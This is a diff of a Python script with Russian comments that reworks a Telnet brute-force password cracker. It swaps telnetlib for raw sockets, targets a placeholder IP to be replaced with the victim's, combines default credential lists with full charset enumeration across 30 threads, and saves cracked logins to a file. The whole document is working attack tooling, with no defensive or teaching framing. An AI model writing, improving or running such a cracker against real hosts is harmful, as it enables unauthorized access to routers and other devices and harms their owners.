@@ -1,55 +1,128 @@
-import telnetlib
+import socket
+import threading
 import itertools
 import string
-from concurrent.futures import ThreadPoolExecutor
+import os
 
-host = "192.168.1.1"  # ЗАМЕНИ на IP цели
+host = "192.168.1.1"  # Заменить на цель
 port = 23
 
-logins = ["admin", "root", "user", "guest"]
-charset = string.ascii_lowercase + string.digits
-min_len = 1
-max_len = 3
-max_threads = 20
-
+max_threads = 30
 found = False
+lock = threading.Lock()
+
+# Популярные логины (если файл не найден)
+default_logins = ["admin", "root", "user", "guest", "test"]
+
+# Популярные пароли (если файл не найден)
+default_passwords = ["admin", "password", "123456", "root", "1234", "guest", "test"]
+
+# Набор символов для перебора
+charset = string.ascii_letters + string.digits
+min_len = 1
+max_len = 4
+
+def recv_until(sock, expected_list, timeout=5):
+    sock.settimeout(timeout)
+    data = b""
+    try:
+        while True:
+            chunk = sock.recv(1024)
+            if not chunk:
+                break
+            data += chunk
+            for exp in expected_list:
+                if exp in data:
+                    return exp, data
+    except socket.timeout:
+        pass
+    return None, data
 
 def try_login(username, password):
     global found
     if found:
         return
     try:
-        tn = telnetlib.Telnet(host, port, timeout=5)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(5)
+        sock.connect((host, port))
 
-        # Ожидаем приглашение логина с таймаутом
-        idx, _, _ = tn.expect([b"login:", b"Login:"], timeout=3)
-        if idx == -1:
-            tn.close()
+        prompt, _ = recv_until(sock, [b"login:", b"Login:"], timeout=3)
+        if not prompt:
+            sock.close()
             return
 
-        tn.write(username.encode() + b"\n")
+        sock.sendall(username.encode() + b"\n")
 
-        # Ожидаем запрос пароля
-        idx, _, _ = tn.expect([b"Password:", b"password:"], timeout=3)
-        if idx == -1:
-            tn.close()
+        prompt, _ = recv_until(sock, [b"Password:", b"password:"], timeout=3)
+        if not prompt:
+            sock.close()
             return
 
-        tn.write(password.encode() + b"\n")
+        sock.sendall(password.encode() + b"\n")
 
-        # Ожидаем ответ, ограниченный по времени
-        idx, match, text = tn.expect([b"incorrect", b"failed", b"login"], timeout=3)
+        prompt, response = recv_until(sock, [b"incorrect", b"failed", b"Login incorrect"], timeout=3)
 
-        if idx == -1:
-            # Не нашли ошибок — возможно успех
-            print(f"\n[!!!] УСПЕХ: {username}:{password}")
-            found = True
-        else:
-            # Нашли ошибку — значит неудача
-            pass
-
-        tn.close()
+        if not prompt:
+            with lock:
+                if not found:
+                    found = True
+                    print(f"\n[!!!] УСПЕХ: {username}:{password}")
+                    with open("found.txt", "a") as f:
+                        f.write(f"{username}:{password}\n")
+        sock.close()
     except Exception as e:
-        # Можно раскомментировать для отладки:
-        # print(f"Ошибка: {e}")
         pass
+
+def worker_queue(q):
+    while not q.empty() and not found:
+        username, password = q.get()
+        print(f"Пробуем: {username}:{password}", end='\r')
+        try_login(username, password)
+        q.task_done()
+
+def load_list_from_file(filename, default_list):
+    if os.path.isfile(filename):
+        with open(filename, "r") as f:
+            lines = [line.strip() for line in f if line.strip()]
+            if lines:
+                return lines
+    return default_list
+
+def generate_passwords(charset, min_len, max_len):
+    for length in range(min_len, max_len + 1):
+        for pwd_tuple in itertools.product(charset, repeat=length):
+            yield ''.join(pwd_tuple)
+
+if __name__ == "__main__":
+    from queue import Queue
+
+    logins = load_list_from_file("logins.txt", default_logins)
+    passwords = load_list_from_file("passwords.txt", default_passwords)
+
+    q = Queue()
+
+    # Сначала словарные пары (логин x пароль из словарей)
+    for username in logins:
+        for password in passwords:
+            q.put((username, password))
+
+    # Если не нашли, добавим полный перебор паролей для каждого логина
+    for username in logins:
+        for password in generate_passwords(charset, min_len, max_len):
+            q.put((username, password))
+
+    threads = []
+
+    for _ in range(max_threads):
+        t = threading.Thread(target=worker_queue, args=(q,))
+        t.daemon = True
+        t.start()
+        threads.append(t)
+
+    q.join()
+
+    if not found:
+        print("\n[!!!] Пароль не найден в заданных пределах.")
+    else:
+        print("\n[!!!] Готово, данные записаны в found.txt")
